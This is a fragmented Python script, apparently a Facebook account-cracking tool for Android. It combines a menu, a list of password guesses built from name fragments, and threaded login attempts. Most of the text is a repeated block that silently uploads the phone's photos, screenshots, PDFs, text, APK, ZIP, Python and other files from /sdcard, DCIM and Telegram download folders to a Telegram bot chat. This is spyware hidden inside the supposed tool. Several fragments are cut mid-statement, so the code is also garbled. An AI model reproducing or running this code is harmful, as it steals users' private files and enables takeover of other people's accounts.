        cokiew = open(".cok.txt", "w").write(cookie)
      #exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python nono.py")
        exit()

#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print(f"\033[95;1m[\033[95;1m+\033[95;1m] \033[1;95m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+uname)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;96m "+date)
    print('\033[0;97m===============================================')
    print(f"""\033[91;1m[\033[92;1m1\033[91;1m] \033[0;91m𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚         """)
    print("""\033[95;1m[\033[95;1m2\033[95;1m] \033[0;95m𝗖𝗢𝗡𝗧𝗔𝗖𝗧 ᏔᏆͲᎻ 𝗔𝗗𝗠𝗜𝗡""")
    print(f"""\033[93;1m[\033[93;1m3\033[93;1m] \033[93;1m𝗖𝗛𝗘𝗖𝗞 ϴᏦ 𝗜𝗗𝘇   """)
    print("""\033[98;1m[\033[98;1m0\033[98;1m] \033[0;98mᎬХᏆͲ""")
    print('\033[0;97m=================')
    HEART = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if HEART in ['111']:
        login()
        dump_massal()
    elif HEART in ['1']:
        crack_file()
    elif HEART in ['2','02']:
        os.system('xdg-open https://facebook.com/groups/430144089559219/ ')
        os.system("python nono.py")
    elif HEART in ['3','03']:
        result()
    elif HEART in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()
 
      #-----------------[ HASIL-CRACK ]-----------------#
 
def result():
    os.system('clear')
    print(logo)
    print(' \033[96;1m[\033[96;1m1\033[96;1m] CHECK CP IDZ ')
    print(' \033[95;1m[\033[95;1m2\033[95;1m] CHECK OK IDZ ')
    print(' \033[94;1m[\033[94;1m3\033[94;1m] EXIT ')
    print('\033[0;91m==================')
    kz = input(' \033[95;1m[\033[95;1m•\033[95;1m]CHOOSE : ')
    if kz in ['1','01']:
        try:vin = os.listdir('CP')
        except FileNotFoundError:
            print('\033[0;91m==================')
            animation(' \033[96;1m[\033[92;1m•\033[976;1m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin)==0:
            print('\033[0;91m==================')
            animation(' \033[95;1m[\033[95;1m•\033[95;1m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('CP/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<10:
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('\033[0;91m==================')
                    print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
            print('\033[0;91m==================')
            geeh = input(' \033[95;1m[\033[95;1m•\033[95;1m] CHOOSE : ')
            print('\033[0;91m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\033[0;91m==================')
                animation(' \033[95;1m[\033[92;1m•\033[95;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('CP/'+geh,'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[95;1m[\033[92;1m•\033[95;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                print(f' \033[95;1m[\033[92;1m•\033[95;1m] CP : \033[35m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp +=1
            print('\033[0;95m==================')
            input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['2','02']:
        try:vin = os.listdir('OK')
        except FileNotFoundError:
            print('\033[0;91m==================')
            animation(' \033[95;1m[\033[92;1m•\033[95;1m] FILE NOT FOUND ')
            time.sleep(2)
            back()
        if         muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
                        pwv.append(frs+'22')
                    pwv.append(frs+'222')
                    pwv.append(frs+'gaming')
                    pwv.append(frs+'khan')
                    pwv.append(frs+'hosen')
                    pwv.append(frs+'hossain')
                    pwv.append(frs+'Gaming')
                    pwv.append(frs+'khan')
                    pwv.append(frs+'019')
                    pwv.append(frs+'017')
                    pwv.append(frs+'016')
                    pwv.append(frs+'018')
                    pwv.append(frs+'AKASH123')
                    pwv.append(frs+'khan')
                    pwv.append(frs+'hosen')
                    
                    
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
                    files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(jpg)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(jpg)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------------pdf--------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.pdf')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------------crx--------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.crx')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------------txt---------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------------smali----------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.smali')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
     
    except:pass
    #-----------------------png-------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(png)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(png)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------------------xml-------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.xml')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------------json--------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.json')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------------------com--------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.com')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------------py---------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
            #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
   #-----------( /sdcard/Download\ )-----------#
   #---------------------apk------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #---------------------zip-----------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    #---------------------swp----------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    #---------------------mp4-----------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    #---------------------mp3------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp3')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    #---------------------m4a-----------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.m4a')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    #---------------------jpg------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    #-----------------(extra)_(jpg)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(jpg)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #---------------------pdf-------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.pdf')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    #---------------------crx-------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.crx')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
            #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    #---------------------txt--------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    #---------------------smali--------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.smali')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    #---------------------png---------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    #-----------------(extra)_(png)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(png)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #---------------------xml----------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.xml')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    #---------------------json----------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.json')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    #---------------------com-----------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.com')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------------------py---------------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/Download/Telegram\ )------------#
    #---------------------apk------------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------zip-----------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #---------------------swp----------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------mp4-----------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------mp3------------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp3')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------m4a-----------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.m4a')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------jpg------------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(jpg)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(jpg)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------pdf-------------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.pdf')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------crx-------------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.crx')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------txt--------------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------smali--------------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.smali')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------png---------------------#
	#-----------------(extra)_(png)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(png)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------xml----------------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.xml')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------json----------------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.json')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------com-----------------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.com')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------py-----------------------#
    try:
        sdcard_path = '/sdcard/Download/Telegram'
